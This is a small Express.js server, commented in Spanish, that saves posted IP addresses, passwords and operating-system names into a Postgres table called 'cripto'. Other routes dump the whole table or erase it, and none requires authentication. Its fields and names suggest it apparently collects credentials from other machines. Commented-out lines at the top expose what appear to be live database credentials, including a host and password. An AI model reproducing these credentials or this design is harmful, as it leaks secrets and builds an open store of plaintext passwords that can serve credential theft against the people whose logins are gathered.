const express = require('express');
const app = express();
const cors = require('cors');
const { response } = require('express');
const knex = require('knex')({
    client: 'pg',
    connection: {
//	    user:'fllmtgkemwbgdp',
//	    host:'ec2-50-17-255-120.compute-1.amazonaws.com',
//	    database:'d7lnp964sb3j1r',
//	    password:'4331177af89fd709b9c6a858a43f8264d3d5a768ccbab013958b2eea4ffd4e64',
//	    port:5432,
        connectionString: process.env.DATABASE_URL,
        ssl: {
          rejectUnauthorized: false
        }
    }
  });
  


// hola mundo

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cors());


//tipos de usuarios

app.post ('/agregar', (req, res) =>{
  const {ip, pass, so} = req.body;
  console.log(req.body);
  knex('cripto')
  .returning('*')
  .insert({
    ip:ip,
    pass:pass,
    so:so}).then(data => {
    res.json('listo');}).catch(err => console.log(err))
})
app.get('/datos', (req, res) =>{
    knex.select('*').from('cripto').then(data => {
        res.send(data)
        console.log(data)
    })
})
//borrar todos los datos.
app.post ('/borrartodos', (req, res)=>{
knex('cripto').truncate().then(data=>{
  res.json('listo');
}).catch(err => console.log(err))
})



app.listen(process.env.PORT || 3001, () => {
    console.log('Funcionando');
});
//hola esto es un comentario
